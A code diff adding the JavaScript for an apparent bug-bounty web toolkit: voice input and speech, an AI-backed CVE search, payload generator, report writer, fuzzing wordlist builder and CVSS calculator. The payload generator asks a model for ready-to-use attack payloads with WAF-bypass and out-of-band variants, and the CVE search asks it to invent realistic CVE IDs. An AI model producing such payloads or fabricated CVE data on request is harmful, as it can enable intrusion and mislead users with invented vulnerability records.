+    showVoiceStatus('Voice input needs Chrome or Edge browser');
+    setTimeout(hideVoiceStatus, 3000);
+    return;
+  }
+  if (!VOICE.recognition) initSpeechRecognition();
+  if (VOICE.listening) {
+    VOICE.recognition.stop();
+  } else {
+    stopSpeaking();
+    VOICE.recognition.start();
+  }
+}
+
+function stopVoice() {
+  if (VOICE.listening && VOICE.recognition) VOICE.recognition.stop();
+  stopSpeaking();
+  hideVoiceStatus();
+}
+
+function stopSpeaking() {
+  VOICE.speaking = false;
+  if (VOICE.canSpeak) VOICE.synthesis.cancel();
+  if (VOICE.currentAudio) { VOICE.currentAudio.pause(); VOICE.currentAudio = null; }
+  document.getElementById('voice-btn').className = 'voice-btn';
+  document.getElementById('voice-btn').textContent = '🎤';
+}
+
+// ── Text to Speech — works in ALL browsers ────────────────────────────────────
+function speakText(text) {
+  const clean = text
+    .replace(/```[\s\S]*?```/g, '')
+    .replace(/`[^`]+`/g, '')
+    .replace(/\*\*(.+?)\*\*/g, '$1')
+    .replace(/#{1,6}\s/g, '')
+    .replace(/<[^>]+>/g, ' ')
+    .replace(/[\u{1F000}-\u{1FFFF}]/gu, '')
+    .replace(/\s+/g, ' ')
+    .trim()
+    .slice(0, 250);
+
+  if (!clean || clean.length < 3) return;
+
+  if (VOICE.canSpeak) {
+    try {
+      VOICE.synthesis.cancel();
+      const utter = new SpeechSynthesisUtterance(clean);
+      utter.rate = 1.0;
+      utter.pitch = 1.0;
+      utter.volume = 1.0;
+      utter.lang = 'en-US';
+
+      // Load voices — Chrome needs this async
+      let voices = VOICE.synthesis.getVoices();
+      if (!voices.length) {
+        // Voices not loaded yet — wait and retry
+        VOICE.synthesis.onvoiceschanged = () => {
+          voices = VOICE.synthesis.getVoices();
+          assignVoiceAndSpeak(utter, voices, clean);
+        };
+        return;
+      }
+      assignVoiceAndSpeak(utter, voices, clean);
+      return;
+    } catch(e) {
+      console.log('[Voice] Web Speech error:', e.message);
+    }
+  }
+  // Firefox fallback
+  speakWithAudio(clean);
+}
+
+function assignVoiceAndSpeak(utter, voices, clean) {
+  const best = voices.find(v => v.name.includes('Google US English'))
+    || voices.find(v => v.name.includes('Microsoft Aria'))
+    || voices.find(v => v.name.includes('Microsoft David'))
+    || voices.find(v => v.name === 'Samantha')
+    || voices.find(v => v.lang === 'en-US')
+    || voices.find(v => v.lang.startsWith('en'))
+    || voices[0];
+  if (best) utter.voice = best;
+
+  utter.onstart = () => {
+    VOICE.speaking = true;
+    if (!VOICE.listening) {
+      document.getElementById('voice-btn').className = 'voice-btn speaking';
+      document.getElementById('voice-btn').textContent = '🔊';
+    }
+    showVoiceStatus('AI speaking...');
+  };
+  utter.onend = () => {
+    VOICE.speaking = false;
+    if (!VOICE.listening) {
+      document.getElementById('voice-btn').className = 'voice-btn';
+      document.getElementById('voice-btn').textContent = '🎤';
+    }
+    hideVoiceStatus();
+  };
+  utter.onerror = (e) => {
+    VOICE.speaking = false;
+    hideVoiceStatus();
+    document.getElementById('voice-btn').className = 'voice-btn';
+    document.getElementById('voice-btn').textContent = '🎤';
+    if (e.error !== 'interrupted' && e.error !== 'canceled') {
+      speakWithAudio(clean); // Fallback
+    }
+  };
+
+  VOICE.synthesis.speak(utter);
+}
+
+function speakWithAudio(text) {
+  // Audio fallback for Firefox / when Web Speech fails
+  try {
+    const encoded = encodeURIComponent(text.slice(0, 200));
+    const url = 'https://translate.google.com/translate_tts?ie=UTF-8&q=' + encoded + '&tl=en-us&client=tw-ob';
+    const audio = new Audio(url);
+    VOICE.currentAudio = audio;
+    audio.onplay = () => {
+      VOICE.speaking = true;
+      document.getElementById('voice-btn').className = 'voice-btn speaking';
+      document.getElementById('voice-btn').textContent = '🔊';
+      showVoiceStatus('AI speaking...');
+    };
+    audio.onended = () => {
+      VOICE.speaking = false;
+      document.getElementById('voice-btn').className = 'voice-btn';
+      document.getElementById('voice-btn').textContent = '🎤';
+      hideVoiceStatus();
+      VOICE.currentAudio = null;
+    };
+    audio.onerror = () => { VOICE.speaking = false; hideVoiceStatus(); VOICE.currentAudio = null; };
+    audio.play().catch(() => { VOICE.speaking = false; VOICE.currentAudio = null; });
+  } catch(e) {}
+}
+
+
+function showVoiceStatus(msg) {
+  const el = document.getElementById('voice-status');
+  document.getElementById('voice-status-text').textContent = msg;
+  el.classList.add('show');
+}
+function hideVoiceStatus() {
+  document.getElementById('voice-status').classList.remove('show');
+}
+
+// ─── TOOLKIT ───────────────────────────────────────────────────────────────
+
+function showTool(id) {
+  document.querySelectorAll('.toolkit-panel').forEach(p => p.style.display = 'none');
+  document.querySelectorAll('.tool-nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tool-' + id).style.display = 'block';
+  document.getElementById('tn-' + id).classList.add('active');
+  if (id === 'cvss') calcCVSS();
+}
+
+// ─── CVE Search ────────────────────────────────────────────────────────────
+async function searchCVE() {
+  const q = document.getElementById('cve-query').value.trim();
+  const sev = document.getElementById('cve-severity').value;
+  if (!q) return;
+  const loading = document.getElementById('cve-loading');
+  const results = document.getElementById('cve-results');
+  loading.style.display = 'block';
+  results.innerHTML = '';
+
+  try {
+    const resp = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1000,
+        system: `You are a CVE/security vulnerability database assistant. When the user searches for a vulnerability or tech keyword, respond ONLY with a JSON array of 5-8 relevant CVEs in this exact structure (no markdown, no extra text):
+[{"id":"CVE-XXXX-XXXXX","score":9.8,"severity":"CRITICAL","description":"Brief 1-2 sentence description","affected":"software name and versions","published":"2024","tags":["injection","auth","rce"]}]
+Severity must be: CRITICAL (9.0-10), HIGH (7.0-8.9), MEDIUM (4.0-6.9), LOW (0.1-3.9). Always include realistic CVE IDs. Return only the JSON array.`,
+        messages: [{ role: 'user', content: 'Search: ' + q + (sev ? ' | Filter severity: ' + sev : '') }]
+      })
+    });
+    loading.style.display = 'none';
+    const data = await resp.json();
+    const text = data.content?.map(c => c.text || '').join('');
+    let cves;
+    try {
+      const clean = text.replace(/```json|```/g, '').trim();
+      cves = JSON.parse(clean);
+    } catch(e) {
+      results.innerHTML = '<div style="color:var(--muted);font-size:12px;padding:12px">No CVEs found for that query. Try different keywords.</div>';
+      return;
+    }
+    if (!cves.length) {
+      results.innerHTML = '<div style="color:var(--muted);font-size:12px;padding:12px">No CVEs found.</div>';
+      return;
+    }
+    results.innerHTML = '<div style="font-size:11px;color:var(--muted);margin-bottom:10px">Found ' + cves.length + ' CVEs for "' + q + '"</div>' +
+      cves.map(cve => {
+        const sevCls = cve.severity === 'CRITICAL' ? 'crit' : cve.severity === 'HIGH' ? 'high' : cve.severity === 'MEDIUM' ? 'med' : 'low';
+        const tags = (cve.tags || []).map(t => `<span class="cve-tag">${t}</span>`).join('');
+        return `<div class="cve-card">
+          <div class="cve-card-header">
+            <span class="cve-id">${cve.id}</span>
+            <span class="cve-score ${sevCls}">${cve.severity} ${cve.score}</span>
+          </div>
+          <div class="cve-desc">${cve.description}</div>
+          <div style="font-size:10px;color:var(--primary);margin-bottom:7px">📦 Affected: ${cve.affected} | 📅 ${cve.published}</div>
+          <div class="cve-tags">${tags}</div>
+        </div>`;
+      }).join('');
+  } catch(e) {
+    loading.style.display = 'none';
+    results.innerHTML = '<div style="color:var(--red);font-size:12px">Error: ' + e.message + '. Make sure server is running.</div>';
+  }
+}
+
+// ─── Payload Generator ─────────────────────────────────────────────────────
+async function generatePayloads() {
+  const type = document.getElementById('payload-type').value;
+  const ctx = document.getElementById('payload-context').value;
+  const target = document.getElementById('payload-target-hint').value.trim();
+  const loading = document.getElementById('payload-loading');
+  const results = document.getElementById('payload-results');
+  loading.style.display = 'block';
+  results.innerHTML = '';
+
+  const prompt = `Generate 12 targeted ${type.toUpperCase()} payloads for ${ctx} context${target ? ' for target: ' + target : ''}. 
+Respond ONLY with a JSON array of payload objects:
+[{"category":"Basic","payload":"<payload here>","notes":"brief explanation"}]
+Include categories like: Basic, WAF Bypass, Encoded, Advanced, OAST/Out-of-band. Each payload should be directly usable. No markdown, just the JSON array.`;
+
+  try {
+    const resp = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1000,
+        system: 'You are a security research assistant specializing in generating penetration testing payloads for authorized bug bounty testing. Always remind users to only test systems they have authorization to test.',
+        messages: [{ role: 'user', content: prompt }]
+      })
+    });
+    loading.style.display = 'none';
+    const data = await resp.json();
+    const text = data.content?.map(c => c.text || '').join('');
+    let payloads;
+    try {
+      const clean = text.replace(/```json|```/g, '').trim();
+      payloads = JSON.parse(clean);
+    } catch(e) {
+      results.innerHTML = '<div style="color:var(--muted);font-size:12px;padding:12px">Could not parse payloads. Try again.</div>';
+      return;
+    }
+
+    // Group by category
+    const groups = {};
+    payloads.forEach(p => { if (!groups[p.category]) groups[p.category] = []; groups[p.category].push(p); });
+
+    results.innerHTML = '<div style="font-size:11px;color:var(--amber);background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);border-radius:7px;padding:8px 12px;margin-bottom:12px">⚠️ For authorized testing only. Use responsibly.</div>' +
+      Object.entries(groups).map(([cat, items]) => `
+        <div class="payload-block">
+          <div class="payload-label">${cat}</div>
+          ${items.map((p, i) => `
+            <div style="margin-bottom:${i < items.length-1 ? '10px' : '0'};border-bottom:${i < items.length-1 ? '1px solid rgba(99,102,241,0.1)' : 'none'};padding-bottom:${i < items.length-1 ? '10px' : '0'}">
+              <div class="payload-code">${escHtml(p.payload)}</div>
+              <div style="font-size:10px;color:var(--muted);margin-top:3px">${p.notes || ''}</div>
+              <button class="payload-copy-btn" onclick="copyText('${escAttr(p.payload)}', this)">📋 Copy</button>
+            </div>`).join('')}
+        </div>`).join('');
+  } catch(e) {
+    loading.style.display = 'none';
+    results.innerHTML = '<div style="color:var(--red);font-size:12px">Error: ' + e.message + '</div>';
+  }
+}
+
+// ─── Bug Report Builder ─────────────────────────────────────────────────────
+async function generateReport_builder() {
+  const platform = document.getElementById('rpt-platform').value;
+  const severity = document.getElementById('rpt-severity').value;
+  const vulnType = document.getElementById('rpt-vuln-type').value.trim();
+  const url = document.getElementById('rpt-url').value.trim();
+  const desc = document.getElementById('rpt-desc').value.trim();
+  const impact = document.getElementById('rpt-impact').value.trim();
+  const cvss = document.getElementById('rpt-cvss').value.trim();
+
+  if (!vulnType || !url || !desc) {
+    alert('Please fill in Vulnerability Type, Affected URL and Description at minimum.');
+    return;
+  }
+
+  const loading = document.getElementById('report-loading');
+  const output = document.getElementById('report-builder-output');
+  loading.style.display = 'block';
+  output.innerHTML = '';
+
+  const prompt = `Write a professional bug bounty report for the ${platform} platform in their standard format.
+Platform: ${platform}
+Severity: ${severity}
+Vulnerability: ${vulnType}
+Affected URL: ${url}
+Description: ${desc}
+Impact: ${impact}
+CVSS Score: ${cvss || 'not provided'}
+
+Include: Title, Severity, Summary, Vulnerability Details, Steps to Reproduce (numbered), PoC (curl/code), Impact Analysis, Recommended Fix, References. Format it as a complete, professional, submission-ready report. Use Markdown formatting.`;
+
+  try {
+    const resp = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1000,
+        system: 'You are an expert bug bounty hunter who writes professional, well-structured vulnerability reports that maximize payout likelihood. Your reports are clear, technically accurate, and follow platform-specific formatting standards.',
+        messages: [{ role: 'user', content: prompt }]
+      })
+    });
+    loading.style.display = 'none';
+    const data = await resp.json();
+    const text = (data.content?.map(c => c.text || '').join('') || '').replace(/\n/g, '<br>').replace(/`([^`\n]+)`/g, '<code style="background:rgba(0,0,0,.35);padding:1px 5px;border-radius:4px;color:var(--cyan)">$1</code>').replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>').replace(/^#{1,3} (.+)/gm, s => `<span style="color:var(--cyan);font-weight:700;font-family:var(--display)">${s.replace(/^#+\s/,'')}</span>`);
+    output.innerHTML = `
+      <div style="display:flex;justify-content:flex-end;margin-bottom:8px;gap:8px">
+        <button class="report-btn" onclick="copyEl('report-builder-raw')">📋 Copy Markdown</button>
+        <button class="report-btn" onclick="downloadText(document.getElementById('report-builder-raw').textContent, 'bug-report.md')">⬇️ Download .md</button>
+      </div>
+      <div class="report-out" id="report-builder-rendered">${text}</div>
+      <div id="report-builder-raw" style="display:none">${data.content?.map(c=>c.text||'').join('')}</div>`;
+  } catch(e) {
+    loading.style.display = 'none';
+    output.innerHTML = '<div style="color:var(--red);font-size:12px">Error: ' + e.message + '</div>';
+  }
+}
+
+// ─── Wordlist Builder ───────────────────────────────────────────────────────
+async function generateWordlist() {
+  const domain = document.getElementById('wl-domain').value.trim();
+  const type = document.getElementById('wl-type').value;
+  const tech = document.getElementById('wl-tech').value.trim();
+  const size = document.getElementById('wl-size').value;
+
+  if (!domain) { alert('Enter a target domain.'); return; }
+
+  const loading = document.getElementById('wordlist-loading');
+  const output = document.getElementById('wordlist-output');
+  loading.style.display = 'block';
+  output.innerHTML = '';
+
+  const sizeCounts = { small: 50, medium: 150, large: 400 };
+  const prompt = `Generate a ${size} (${sizeCounts[size]} entries) custom wordlist for ${type} fuzzing.
+Target domain: ${domain}
+Tech stack / industry: ${tech || 'unknown'}
+Wordlist type: ${type}
+
+Respond with ONLY a plain text list, one entry per line. No numbering, no bullets, no explanations, no markdown. Just the raw wordlist entries. For subdomains: single words/labels only (no domain). For directories: no leading slash. Make it realistic and targeted for the specified context.`;
+
+  try {
+    const resp = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1000,
+        system: 'You are a bug bounty recon expert. Generate targeted, realistic wordlists based on the target context. Focus on entries most likely to yield findings for that specific tech stack and industry.',
+        messages: [{ role: 'user', content: prompt }]
+      })
+    });
+    loading.style.display = 'none';
+    const data = await resp.json();
+    const text = data.content?.map(c => c.text || '').join('').trim();
+    const lines = text.split('\n').filter(l => l.trim() && !l.startsWith('#'));
+    output.innerHTML = `
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <span style="font-size:11px;color:var(--muted)">${lines.length} entries generated for ${type} — ${domain}</span>
+        <div style="display:flex;gap:8px">
+          <button class="report-btn" onclick="copyText(document.getElementById('wordlist-raw').textContent, this)">📋 Copy</button>
+          <button class="report-btn" onclick="downloadText(document.getElementById('wordlist-raw').textContent, 'wordlist-${type}-${domain}.txt')">⬇️ .txt</button>
+        </div>
+      </div>
+      <div style="background:#060a10;border:1px solid var(--card-border);border-radius:10px;padding:14px;max-height:400px;overflow-y:auto">
+        <pre id="wordlist-raw" style="font-size:11px;color:var(--cyan);line-height:1.8;margin:0;font-family:var(--mono)">${escHtml(lines.join('\n'))}</pre>
+      </div>`;
+  } catch(e) {
+    loading.style.display = 'none';
+    output.innerHTML = '<div style="color:var(--red);font-size:12px">Error: ' + e.message + '</div>';
+  }
+}
+
+// ─── CVSS 3.1 Calculator ────────────────────────────────────────────────────
+function calcCVSS() {
+  const avMap = { N: 0.85, A: 0.62, L: 0.55, P: 0.20 };
+  const acMap = { L: 0.77, H: 0.44 };
+  const prMapU = { N: 0.85, L: 0.62, H: 0.27 };
+  const prMapC = { N: 0.85, L: 0.68, H: 0.50 };
+  const uiMap = { N: 0.85, R: 0.62 };
+  const impMap = { H: 0.56, L: 0.22, N: 0.00 };
+
+  const av = document.getElementById('cvss-av')?.value || 'N';
+  const ac = document.getElementById('cvss-ac')?.value || 'L';
+  const pr = document.getElementById('cvss-pr')?.value || 'N';
+  const ui = document.getElementById('cvss-ui')?.value || 'N';
+  const s  = document.getElementById('cvss-s')?.value  || 'U';
+  const c  = document.getElementById('cvss-c')?.value  || 'H';
+  const i  = document.getElementById('cvss-i')?.value  || 'H';
+  const a  = document.getElementById('cvss-a')?.value  || 'H';
+
+  const prVal = s === 'C' ? prMapC[pr] : prMapU[pr];
+  const iss = 1 - (1 - impMap[c]) * (1 - impMap[i]) * (1 - impMap[a]);
+  let impact;
+  if (s === 'U') { impact = 6.42 * iss; }
+  else { impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15); }
+  if (impact <= 0) { renderCVSS(0.0, av, ac, pr, ui, s, c, i, a); return; }
+  const exploitability = 8.22 * avMap[av] * acMap[ac] * prVal * uiMap[ui];
+  let base;
+  if (s === 'U') { base = Math.min(impact + exploitability, 10); }
+  else { base = Math.min(1.08 * (impact + exploitability), 10); }
+  const score = Math.ceil(base * 10) / 10;
+  renderCVSS(score, av, ac, pr, ui, s, c, i, a);
+}
+
+function renderCVSS(score, av, ac, pr, ui, s, c, i, a) {
+  const rat = score >= 9.0 ? 'CRITICAL' : score >= 7.0 ? 'HIGH' : score >= 4.0 ? 'MEDIUM' : score >= 0.1 ? 'LOW' : 'NONE';
+  const col = score >= 9.0 ? 'var(--red)' : score >= 7.0 ? 'var(--amber)' : score >= 4.0 ? 'var(--primary)' : 'var(--green)';
+  const vector = `CVSS:3.1/AV:${av}/AC:${ac}/PR:${pr}/UI:${ui}/S:${s}/C:${c}/I:${i}/A:${a}`;
+  const el = document.getElementById('cvss-score');
+  const rel = document.getElementById('cvss-rating');
+  const vel = document.getElementById('cvss-vector');
+  if (el) { el.textContent = score.toFixed(1); el.style.color = col; }
+  if (rel) { rel.textContent = rat; rel.style.color = col; }
+  if (vel) vel.textContent = vector;
+
+  const expl = {
+    AV: { N: 'Exploitable remotely over the network', A: 'Requires adjacent network access', L: 'Requires local access', P: 'Requires physical access' },
+    AC: { L: 'No special conditions required', H: 'Requires specialized conditions' },
+    PR: { N: 'No authentication needed', L: 'Requires low-privileged access', H: 'Requires admin-level access' },
+    UI: { N: 'No user interaction needed', R: 'Requires user interaction' },
+    S: { U: 'Impact contained to vulnerable component', C: 'Impact spans beyond vulnerable component' }
+  };
+  const expEl = document.getElementById('cvss-explanation');
+  if (expEl) expEl.innerHTML = `<strong style="color:var(--text)">Score Breakdown:</strong><br>
+    ${expl.AV[av]} · ${expl.AC[ac]} · ${expl.PR[pr]} · ${expl.UI[ui]} · ${expl.S[s]}.<br>
+    <strong style="color:var(--cyan)">Estimated Bug Bounty Range:</strong> ${score >= 9.0 ? '$5,000 – $50,000+ (P1)' : score >= 7.0 ? '$1,500 – $10,000 (P2)' : score >= 4.0 ? '$300 – $2,000 (P3)' : '$50 – $500 (P4/Info)'}`;
+}
+
+// ─── Utilities ──────────────────────────────────────────────────────────────
+function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function escAttr(s) { return String(s).replace(/'/g,"\\'").replace(/\n/g,'\\n'); }
+
+function copyText(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    if (btn && btn.textContent !== undefined) { const orig = btn.textContent; btn.textContent = '✓ Copied!'; setTimeout(() => btn.textContent = orig, 2000); }
+  });
+}
+function copyEl(id) {
+  const el = document.getElementById(id);
+  if (el) navigator.clipboard.writeText(el.textContent);
+}
+function downloadText(text, filename) {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
+  a.download = filename;
+  a.click();
+}
+
+// Init CVSS on load
+setTimeout(calcCVSS, 100);
+
+// Initialize voice on load — NO alerts, NO popups
+initVoice();
+</script>
+</body>
+</html>
